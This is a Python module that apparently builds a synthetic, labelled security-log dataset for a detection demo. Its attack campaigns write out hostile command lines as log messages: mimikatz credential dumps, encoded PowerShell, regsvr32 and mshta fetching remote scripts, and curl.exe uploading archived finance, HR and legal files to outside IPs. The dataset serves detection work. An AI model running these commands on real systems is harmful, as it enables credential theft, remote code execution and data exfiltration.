from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta
import random

import pandas as pd

from nanoaudit.config import ProjectConfig


@dataclass(slots=True)
class EventTemplate:
    source_type: str
    event_type: str
    status: str
    attack_stage: str
    label: int
    message_template: str


BENIGN_HOSTS = ["ws-01", "ws-07", "app-02", "db-01", "proxy-01", "vpn-gw", "dc-01"]
BENIGN_USERS = ["alice", "bob", "carol", "david", "svc-backup", "web-app", "SYSTEM"]
BENIGN_IPS = ["10.0.4.10", "10.0.4.12", "10.0.4.16", "10.0.8.21", "10.0.8.32", "10.0.9.51"]
ATTACK_IPS = ["185.10.10.21", "203.0.113.18", "198.51.100.17", "172.16.20.77"]
MALICIOUS_USERS = ["ops-admin", "finance-admin", "svc-backup", "domain-admin"]


BENIGN_TEMPLATES = [
    EventTemplate(
        source_type="windows_auth",
        event_type="logon_success",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="4624 successful logon for {user} from {src_ip} on {host}",
    ),
    EventTemplate(
        source_type="linux_auth",
        event_type="ssh_success",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="Accepted publickey for {user} from {src_ip} on {host}",
    ),
    EventTemplate(
        source_type="process_creation",
        event_type="process_start",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="Process started: chrome.exe by {user} on {host}",
    ),
    EventTemplate(
        source_type="web_access",
        event_type="http_200",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="GET /portal/status 200 from {src_ip} via {host}",
    ),
    EventTemplate(
        source_type="system_task",
        event_type="backup_job",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="Scheduled backup completed on {host} for volume finance-data",
    ),
    EventTemplate(
        source_type="dns",
        event_type="dns_query",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="DNS query update.vendor.local from {host}",
    ),
    EventTemplate(
        source_type="endpoint",
        event_type="service_start",
        status="success",
        attack_stage="normal_operation",
        label=0,
        message_template="Service spooler started by SYSTEM on {host}",
    ),
    EventTemplate(
        source_type="windows_auth",
        event_type="logon_failure",
        status="failure",
        attack_stage="normal_operation",
        label=0,
        message_template="4625 failed logon for {user} from {src_ip} on {host}",
    ),
]


def ensure_demo_dataset(config: ProjectConfig, force: bool = False) -> pd.DataFrame:
    path = config.paths.data_file
    if force or not path.exists():
        path.parent.mkdir(parents=True, exist_ok=True)
        dataset = build_demo_dataset(config)
        dataset.to_csv(path, index=False, encoding="utf-8")
        return dataset
    return pd.read_csv(path, parse_dates=["timestamp"])


def build_demo_dataset(config: ProjectConfig) -> pd.DataFrame:
    rng = random.Random(config.random_seed)
    base_time = datetime(2026, 3, 1, 8, 0, 0)
    benign_rows = build_benign_rows(config.dataset.benign_events, base_time, rng)
    malicious_rows = build_attack_rows(config.dataset.malicious_events, base_time, rng)
    rows = benign_rows + malicious_rows
    dataset = pd.DataFrame(rows).sort_values("timestamp").reset_index(drop=True)
    dataset.insert(0, "event_id", [f"EVT-{index + 1:04d}" for index in range(len(dataset))])
    dataset["timestamp"] = pd.to_datetime(dataset["timestamp"])
    return dataset


def build_benign_rows(count: int, base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    for index in range(count):
        day_offset = index // 56
        slot = index % 56
        event_time = base_time + timedelta(days=day_offset, minutes=slot * 18)
        template = BENIGN_TEMPLATES[index % len(BENIGN_TEMPLATES)]
        host = rng.choice(BENIGN_HOSTS)
        user = rng.choice(BENIGN_USERS)
        src_ip = rng.choice(BENIGN_IPS)
        if template.event_type == "backup_job":
            event_time = event_time.replace(hour=2 + (index % 2), minute=(index * 7) % 60)
            user = "svc-backup"
        if template.event_type == "logon_failure":
            event_time = event_time.replace(hour=9 + (index % 8), minute=(index * 11) % 60)
        rows.append(
            make_row(
                timestamp=event_time,
                source_type=template.source_type,
                host=host,
                user=user,
                src_ip=src_ip,
                event_type=template.event_type,
                status=template.status,
                attack_stage=template.attack_stage,
                label=template.label,
                message=template.message_template.format(user=user, src_ip=src_ip, host=host),
            )
        )
    return rows


def build_attack_rows(count: int, base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    rows.extend(build_bruteforce_campaign(base_time, rng))
    rows.extend(build_execution_campaign(base_time, rng))
    rows.extend(build_persistence_campaign(base_time, rng))
    rows.extend(build_lateral_movement_campaign(base_time, rng))
    rows.extend(build_exfiltration_campaign(base_time, rng))
    if len(rows) < count:
        rows.extend(build_extra_attack_rows(base_time, count - len(rows), rng))
    return rows[:count]


def build_bruteforce_campaign(base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    start = base_time.replace(hour=1, minute=0) + timedelta(days=1)
    for index in range(15):
        attack_ip = rng.choice(ATTACK_IPS)
        rows.append(
            make_row(
                timestamp=start + timedelta(minutes=index * 3),
                source_type="windows_auth",
                host="vpn-gw",
                user="finance-admin",
                src_ip=attack_ip,
                event_type="logon_failure",
                status="failure",
                attack_stage="credential_access",
                label=1,
                message=f"4625 failed logon for finance-admin from {attack_ip} on vpn-gw",
            )
        )
    return rows


def build_execution_campaign(base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    start = base_time.replace(hour=2, minute=15) + timedelta(days=1)
    execution_messages = [
        "powershell.exe -enc SQBFAFgA on ws-07 by ops-admin",
        "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAA= on ws-07 by ops-admin",
        "mimikatz.exe sekurlsa::logonpasswords on dc-01 by domain-admin",
        "lsass memory read request detected on dc-01 by domain-admin",
        "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA= on ws-01 by ops-admin",
        "mimikatz privilege::debug on dc-01 by domain-admin",
    ]
    for index, message in enumerate(execution_messages):
        rows.append(
            make_row(
                timestamp=start + timedelta(minutes=index * 7),
                source_type="process_creation",
                host="dc-01" if "dc-01" in message else "ws-07",
                user="domain-admin" if "domain-admin" in message else "ops-admin",
                src_ip=rng.choice(ATTACK_IPS),
                event_type="credential_dump" if "mimikatz" in message or "lsass" in message else "powershell_encoded",
                status="success",
                attack_stage="execution",
                label=1,
                message=message,
            )
        )
    return rows


def build_persistence_campaign(base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    start = base_time.replace(hour=23, minute=10) + timedelta(days=2)
    messages = [
        "schtasks /create /sc minute /mo 30 /tn updater /tr calc.exe on app-02",
        "schtasks /create /sc onlogon /tn sync_cache /tr powershell.exe on ws-07",
        "regsvr32 /s /n /u /i:https://198.51.100.17/script.sct scrobj.dll on ws-01",
        "rundll32 javascript:\"..\\mshtml,RunHTMLApplication\" on app-02",
        "schtasks /create /sc daily /tn metrics_sync /tr cmd.exe on ws-01",
        "mshta https://203.0.113.18/stage.hta launched on ws-01",
        "regsvr32 /s /i:https://198.51.100.17/a.sct scrobj.dll on app-02",
        "schtasks /create /sc onstart /tn telemetry /tr regsvr32.exe on ws-07",
    ]
    for index, message in enumerate(messages):
        host = "app-02" if "app-02" in message else "ws-07" if "ws-07" in message else "ws-01"
        event_type = "scheduled_task_create" if "schtasks" in message else "remote_script"
        rows.append(
            make_row(
                timestamp=start + timedelta(minutes=index * 8),
                source_type="process_creation",
                host=host,
                user="svc-backup",
                src_ip=rng.choice(ATTACK_IPS),
                event_type=event_type,
                status="success",
                attack_stage="persistence",
                label=1,
                message=message,
            )
        )
    return rows


def build_lateral_movement_campaign(base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    start = base_time.replace(hour=0, minute=40) + timedelta(days=3)
    hosts = ["app-02", "db-01", "ws-07", "ws-01", "proxy-01", "dc-01", "db-01", "app-02"]
    for index, host in enumerate(hosts):
        rows.append(
            make_row(
                timestamp=start + timedelta(minutes=index * 6),
                source_type="process_creation",
                host=host,
                user="ops-admin",
                src_ip="10.0.8.32",
                event_type="remote_exec",
                status="success",
                attack_stage="lateral_movement",
                label=1,
                message=f"wmic /node:{host} process call create cmd.exe by ops-admin",
            )
        )
    return rows


def build_exfiltration_campaign(base_time: datetime, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    start = base_time.replace(hour=1, minute=5) + timedelta(days=4)
    messages = [
        "7z a C:\\temp\\finance-archive.7z C:\\finance\\quarterly",
        "curl.exe -T C:\\temp\\finance-archive.7z https://198.51.100.17/upload",
        "7z a C:\\temp\\hr-archive.7z C:\\hr\\records",
        "curl.exe -T C:\\temp\\hr-archive.7z https://198.51.100.17/upload",
        "7z a C:\\temp\\legal-archive.7z C:\\legal\\contracts",
        "curl.exe -T C:\\temp\\legal-archive.7z https://203.0.113.18/upload",
        "curl.exe -T C:\\temp\\summary.zip https://198.51.100.17/upload",
    ]
    for index, message in enumerate(messages):
        rows.append(
            make_row(
                timestamp=start + timedelta(minutes=index * 9),
                source_type="proxy",
                host="db-01" if "finance" in message else "app-02",
                user="finance-admin",
                src_ip=rng.choice(ATTACK_IPS),
                event_type="archive_and_upload",
                status="success",
                attack_stage="exfiltration",
                label=1,
                message=message,
            )
        )
    return rows


def build_extra_attack_rows(base_time: datetime, count: int, rng: random.Random) -> list[dict]:
    rows: list[dict] = []
    start = base_time.replace(hour=3, minute=0) + timedelta(days=4)
    for index in range(count):
        rows.append(
            make_row(
                timestamp=start + timedelta(minutes=index * 5),
                source_type="process_creation",
                host=rng.choice(["ws-01", "ws-07", "app-02"]),
                user=rng.choice(MALICIOUS_USERS),
                src_ip=rng.choice(ATTACK_IPS),
                event_type="powershell_encoded",
                status="success",
                attack_stage="execution",
                label=1,
                message=f"powershell.exe -enc EXTRA{index:02d} on ws-07 by ops-admin",
            )
        )
    return rows


def make_row(
    *,
    timestamp: datetime,
    source_type: str,
    host: str,
    user: str,
    src_ip: str,
    event_type: str,
    status: str,
    attack_stage: str,
    label: int,
    message: str,
) -> dict:
    return {
        "timestamp": timestamp,
        "source_type": source_type,
        "host": host,
        "user": user,
        "src_ip": src_ip,
        "event_type": event_type,
        "status": status,
        "attack_stage": attack_stage,
        "label": label,
        "message": message,
    }
